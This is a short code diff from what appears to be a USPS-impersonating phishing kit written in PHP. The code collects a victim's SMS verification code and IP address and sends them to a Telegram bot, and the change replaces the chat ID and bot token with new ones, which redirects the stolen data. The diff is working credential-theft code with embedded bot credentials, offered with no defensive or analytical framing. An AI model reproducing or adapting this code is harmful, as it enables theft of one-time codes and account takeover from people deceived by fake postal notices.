@@ -32,7 +32,7 @@ if(isset($_POST['okbbx'])){
 $ip = getenv("REMOTE_ADDR");
     $message =   $_SESSION["msg"] ;
 $message .= "-------------------- <3 USPS <3-------------------\nSMS Code  : ".$_POST['sms1']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
-sendMessageT('-4141629905',$message,'6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk');
+sendMessageT('-4271405120',$message,'6690006825:AAEnkGpugYNl1PQbquMqeeJWVplp620y2vM');
 $_SESSION["msg"] = $message ;
 
 
